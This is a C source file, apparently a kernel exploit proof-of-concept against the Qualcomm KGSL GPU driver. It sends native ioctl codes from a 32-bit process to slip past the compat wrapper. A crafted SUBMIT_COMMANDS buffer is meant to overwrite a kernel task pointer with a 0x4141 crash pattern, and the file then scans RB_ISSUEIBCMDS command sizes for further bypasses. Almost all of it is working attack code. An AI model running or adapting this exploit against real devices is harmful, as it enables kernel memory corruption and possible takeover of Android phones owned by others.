/**
 * test_bypass2.c — Properly crafted native structs to bypass compat wrapper
 *
 * Discovery: From 32-bit process, using native command codes (not compat table
 * entries) causes kgsl_compat_ioctl to fall through to the regular handler.
 * With TIF_32BIT set, add_ibdesc_list uses 16B CFU @ SP+0x28!
 */
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <string.h>
#include <stdint.h>

int main(void) {
    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0) { printf("open: %d\n", errno); return 1; }
    printf("fd=%d (32-bit process)\n\n", fd);

    /* Create context */
    struct { uint32_t f; uint32_t id; } ctx = {0x12, 0};
    errno = 0; int r = ioctl(fd, 0xc0080913, &ctx);
    printf("CREATE(0x12): ret=%d id=%u errno=%d\n\n", r, ctx.id, errno);
    if (r < 0) { close(fd); return 1; }

    /* ── SUBMIT_COMMANDS with correct struct (bypass compat wrapper) ── */
    printf("=== SUBMIT_COMMANDS bypass ===\n");

    /* The ibdesc that CFU will copy — this is the payload overwriting waiter! */
    struct { uint64_t gpuaddr; uint64_t sizedwords; } ibdesc = {
        0x0ULL,                          /* → pi_tree.left (NULL — safe) */
        0x4141414141414141ULL            /* → TASK pointer (CRASH PATTERN!) */
    };

    /* Build native SUBMIT_COMMANDS struct (56 bytes) */
    uint8_t sbuf[56];
    memset(sbuf, 0, 56);
    *(uint32_t*)(sbuf+0x00) = ctx.id;                        /* context_id */
    *(uint32_t*)(sbuf+0x04) = 0;                             /* flags */
    *(uint64_t*)(sbuf+0x08) = (uint64_t)(uintptr_t)&ibdesc;  /* cmdlist ptr (64-bit) */
    *(uint32_t*)(sbuf+0x10) = 16;                            /* cmdlist_size = 1 ibdesc */
    *(uint32_t*)(sbuf+0x14) = 1;                             /* numcmds */
    *(uint32_t*)(sbuf+0x18) = 0;                             /* timestamp */

    /* Use command code NOT in compat table → falls through to regular handler */
    /* compat[0x3d] = 0xc02c093d (sz=44), we use 0xc038093d (sz=56) — NO MATCH */
    printf("  Sending SUBMIT_COMMANDS(0xc038093d) from 32-bit...\n");
    printf("  ibdesc: ga=0x%016llx sw=0x%016llx\n",
           (unsigned long long)ibdesc.gpuaddr,
           (unsigned long long)ibdesc.sizedwords);
    printf("  ⚠️  If this works, kernel will CRASH!\n");

    errno = 0;
    r = ioctl(fd, 0xc038093d, sbuf);
    printf("  SUBMIT: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");

    if (r == 0) {
        printf("  ⚠️⚠️⚠️  CFU FIRED! Check if kernel crashed! ⚠️⚠️⚠️\n");
    }

    /* ── Also try RB_ISSUEIBCMDS with native cmd ── */
    printf("\n=== RB_ISSUEIBCMDS bypass ===\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib2 = {0x0ULL, 0x1ULL};
        uint8_t ibuf[32];
        memset(ibuf, 0, 32);
        *(uint32_t*)(ibuf+0x00) = ctx.id;                       /* drawctxt_id */
        *(uint32_t*)(ibuf+0x04) = 0;                            /* flags */
        *(uint64_t*)(ibuf+0x08) = (uint64_t)(uintptr_t)&ib2;    /* ibdesc_addr (64-bit) */
        *(uint32_t*)(ibuf+0x10) = 1;                            /* numibs */
        *(uint32_t*)(ibuf+0x14) = 0;                            /* pad */
        *(uint32_t*)(ibuf+0x18) = 0;                            /* timestamp */
        *(uint32_t*)(ibuf+0x1C) = 0;                            /* pad */

        /* Use cmd=0xc0200910 (NOT in compat table at size 32) */
        errno = 0;
        r = ioctl(fd, 0xc0200910, ibuf);
        printf("  ISSUEIB: ret=%d errno=%d (%s)\n", r, errno, r<0?strerror(errno):"OK ✅");
    }

    /* ── Try with different cmd sizes to find the bypass ── */
    printf("\n=== RB_ISSUEIBCMDS size scan (from 32-bit with native struct) ===\n");
    {
        struct { uint64_t ga; uint64_t sw; } ib3 = {0x0ULL, 0x1ULL};
        uint8_t buf[48];
        memset(buf, 0, 48);
        *(uint32_t*)(buf+0x00) = ctx.id;
        *(uint64_t*)(buf+0x08) = (uint64_t)(uintptr_t)&ib3;
        *(uint32_t*)(buf+0x10) = 1;

        for (int sz = 20; sz <= 48; sz += 4) {
            uint32_t cmd = ((uint32_t)3<<30)|(((uint32_t)sz)<<16)|(((uint32_t)0x09)<<8)|(0x10);
            errno = 0;
            r = ioctl(fd, cmd, buf);
            const char *type = (r==0||errno!=22) ? "★★★" : "";
            printf("  sz=%d cmd=0x%08x: ret=%d errno=%d %s %s\n",
                   sz, cmd, r, errno, r<0?strerror(errno):"OK", type);
        }
    }

    ioctl(fd, 0x40040914, &ctx.id);
    close(fd);
    return 0;
}
